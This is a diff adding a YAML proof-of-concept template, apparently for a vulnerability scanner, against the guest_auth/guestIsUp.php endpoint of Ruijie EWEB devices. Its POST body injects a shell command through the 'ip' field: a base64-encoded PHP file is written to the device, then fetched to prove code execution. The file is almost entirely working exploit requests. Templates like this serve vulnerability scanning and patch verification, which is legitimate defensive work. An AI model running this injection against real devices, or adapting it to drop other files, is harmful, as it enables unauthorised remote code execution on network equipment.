@@ -1,0 +1,36 @@
+name: yaml-poc-ruijie-eweb-rce-CT-158830
+binding: 447835b7-74c2-48ec-a90c-439d5a9866c9
+detail:
+    author: system_user
+    vulnerability:
+        id: 6f3a0f9b-d094-4c23-a379-92038e1d1cf0
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r1: randomLowercase(8)
+    r2: randomLowercase(8)
+    phpcode: |
+        "<?php echo '" + r1 + "'; unlink(__FILE__); ?>"
+    payload: base64(phpcode)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /guest_auth/guestIsUp.php
+            headers:
+                Accept-Encoding: gzip, deflate
+                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+            body: |
+                ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /guest_auth/{{r2}}.php
+            headers:
+                Accept-Encoding: gzip, deflate
+        expression: response.body.bcontains(bytes(r1))
+expression: r0() && r1()
